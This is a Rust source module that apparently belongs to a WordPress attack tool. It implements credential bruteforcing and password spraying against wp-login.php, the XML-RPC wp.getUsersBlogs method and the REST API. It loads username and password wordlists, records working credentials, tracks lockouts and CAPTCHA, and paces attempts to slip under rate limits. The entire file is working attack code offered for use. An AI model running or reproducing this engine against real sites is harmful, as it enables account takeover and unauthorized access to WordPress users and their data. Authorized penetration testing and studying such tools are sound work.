use anyhow::{Context, Result};
use crate::http_client::HttpClient;
use crate::models::{BruteforceResults, Credential};
use std::fs;
use std::io::{BufRead, BufReader};
use std::time::Duration;

pub struct BruteforceEngine;

impl BruteforceEngine {
    pub fn bruteforce(
        client: &HttpClient,
        users_file: &str,
        passwords_file: &str,
        bruteforce_type: &str,
        rate_limit: u64,
        stop_on_success: bool,
    ) -> Result<BruteforceResults> {
        let users = Self::load_wordlist(users_file)?;
        let passwords = Self::load_wordlist(passwords_file)?;

        let mut results = BruteforceResults {
            successful: vec![],
            failed_count: 0,
            total_attempts: 0,
            account_lockouts: 0,
            captcha_detected: false,
        };

        let delay = Duration::from_millis(1000 / rate_limit.max(1));

        // Bruteforce: try all passwords for each user
        for username in &users {
            for password in &passwords {
                results.total_attempts += 1;

                match Self::try_login(client, bruteforce_type, username, password) {
                    Ok(LoginResult::Success(endpoint)) => {
                        results.successful.push(Credential {
                            username: username.clone(),
                            password: password.clone(),
                            endpoint,
                        });
                        if stop_on_success {
                            return Ok(results);
                        }
                    }
                    Ok(LoginResult::Failed) => {
                        results.failed_count += 1;
                    }
                    Ok(LoginResult::Lockout) => {
                        results.account_lockouts += 1;
                        break; // Move to next user
                    }
                    Ok(LoginResult::Captcha) => {
                        results.captcha_detected = true;
                        eprintln!("Warning: CAPTCHA detected, stopping bruteforce");
                        return Ok(results);
                    }
                    Err(e) => {
                        eprintln!("Error during login attempt: {}", e);
                        results.failed_count += 1;
                    }
                }

                std::thread::sleep(delay);
            }
        }

        Ok(results)
    }

    pub fn spray(
        client: &HttpClient,
        users_file: &str,
        passwords_file: &str,
        bruteforce_type: &str,
        rate_limit: u64,
    ) -> Result<BruteforceResults> {
        let users = Self::load_wordlist(users_file)?;
        let passwords = Self::load_wordlist(passwords_file)?;

        let mut results = BruteforceResults {
            successful: vec![],
            failed_count: 0,
            total_attempts: 0,
            account_lockouts: 0,
            captcha_detected: false,
        };

        let delay = Duration::from_millis(1000 / rate_limit.max(1));

        // Spray: try one password across all users
        for password in &passwords {
            for username in &users {
                results.total_attempts += 1;

                match Self::try_login(client, bruteforce_type, username, password) {
                    Ok(LoginResult::Success(endpoint)) => {
                        results.successful.push(Credential {
                            username: username.clone(),
                            password: password.clone(),
                            endpoint,
                        });
                    }
                    Ok(LoginResult::Failed) => {
                        results.failed_count += 1;
                    }
                    Ok(LoginResult::Lockout) => {
                        results.account_lockouts += 1;
                    }
                    Ok(LoginResult::Captcha) => {
                        results.captcha_detected = true;
                        eprintln!("Warning: CAPTCHA detected");
                    }
                    Err(e) => {
                        eprintln!("Error during login attempt: {}", e);
                        results.failed_count += 1;
                    }
                }

                std::thread::sleep(delay);
            }
        }

        Ok(results)
    }

    fn load_wordlist(path: &str) -> Result<Vec<String>> {
        let file = fs::File::open(path)
            .with_context(|| format!("Failed to open wordlist: {}", path))?;
        let reader = BufReader::new(file);
        let mut words = vec![];

        for line in reader.lines() {
            let line = line.context("Failed to read line")?;
            let trimmed = line.trim();
            if !trimmed.is_empty() && !trimmed.starts_with('#') {
                words.push(trimmed.to_string());
            }
        }

        Ok(words)
    }

    fn try_login(
        client: &HttpClient,
        bruteforce_type: &str,
        username: &str,
        password: &str,
    ) -> Result<LoginResult> {
        match bruteforce_type {
            "wp-login" => Self::try_wp_login(client, username, password),
            "xmlrpc" => Self::try_xmlrpc(client, username, password),
            "rest-api" => Self::try_rest_api(client, username, password),
            _ => anyhow::bail!("Unknown bruteforce type: {}", bruteforce_type),
        }
    }

    fn try_wp_login(client: &HttpClient, username: &str, password: &str) -> Result<LoginResult> {
        let body = format!("log={}&pwd={}&wp-submit=Log+In", username, password);
        let headers = std::collections::HashMap::from([(
            "Content-Type".to_string(),
            "application/x-www-form-urlencoded".to_string(),
        )]);

        let response = client.post("/wp-login.php", Some(headers), Some(&body))?;
        let status = response.status();
        
        // Extract location header before consuming response
        let location_header = response.headers().get("location").cloned();
        let body_text = response.text().unwrap_or_default();

        // Check for success indicators
        if status.as_u16() == 302 {
            // Redirect usually means success
            if let Some(location) = location_header {
                let location_str = location.to_str().unwrap_or("");
                if !location_str.contains("wp-login.php") && !location_str.contains("error") {
                    return Ok(LoginResult::Success("wp-login.php".to_string()));
                }
            }
        }

        // Check for error indicators
        if body_text.contains("incorrect password") || body_text.contains("lost your password") {
            // Valid username, wrong password
            return Ok(LoginResult::Failed);
        }

        if body_text.contains("Invalid username") || body_text.contains("Unknown username") {
            return Ok(LoginResult::Failed);
        }

        // Check for lockout
        if status.as_u16() == 429 || body_text.contains("locked") || body_text.contains("too many") {
            return Ok(LoginResult::Lockout);
        }

        // Check for CAPTCHA
        if body_text.contains("captcha") || body_text.contains("CAPTCHA") || body_text.contains("recaptcha") {
            return Ok(LoginResult::Captcha);
        }

        Ok(LoginResult::Failed)
    }

    fn try_xmlrpc(client: &HttpClient, username: &str, password: &str) -> Result<LoginResult> {
        let xml_body = format!(
            r#"<?xml version="1.0"?>
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
        <param><value><string>{}</string></value></param>
        <param><value><string>{}</string></value></param>
    </params>
</methodCall>"#,
            username, password
        );

        let headers = std::collections::HashMap::from([(
            "Content-Type".to_string(),
            "text/xml".to_string(),
        )]);

        let response = client.post("/xmlrpc.php", Some(headers), Some(&xml_body))?;
        let status = response.status();
        let body_text = response.text().unwrap_or_default();

        // XML-RPC success typically contains "struct" or "array" in response
        if status.is_success() && !body_text.contains("faultCode") && !body_text.contains("403") {
            if body_text.contains("struct") || body_text.contains("array") {
                return Ok(LoginResult::Success("xmlrpc.php".to_string()));
            }
        }

        if body_text.contains("faultCode") {
            if body_text.contains("403") || body_text.contains("429") {
                return Ok(LoginResult::Lockout);
            }
            return Ok(LoginResult::Failed);
        }

        Ok(LoginResult::Failed)
    }

    fn try_rest_api(client: &HttpClient, username: &str, password: &str) -> Result<LoginResult> {
        // REST API authentication typically uses application passwords or OAuth
        // This is a simplified implementation using Basic auth
        use base64::{Engine as _, engine::general_purpose};
        let auth = general_purpose::STANDARD.encode(format!("{}:{}", username, password));
        let headers = std::collections::HashMap::from([(
            "Authorization".to_string(),
            format!("Basic {}", auth),
        )]);

        let response = client.get("/wp-json/wp/v2/users/me", Some(headers))?;
        
        if response.status().is_success() {
            return Ok(LoginResult::Success("rest-api".to_string()));
        }

        Ok(LoginResult::Failed)
    }
}

enum LoginResult {
    Success(String), // endpoint
    Failed,
    Lockout,
    Captcha,
}
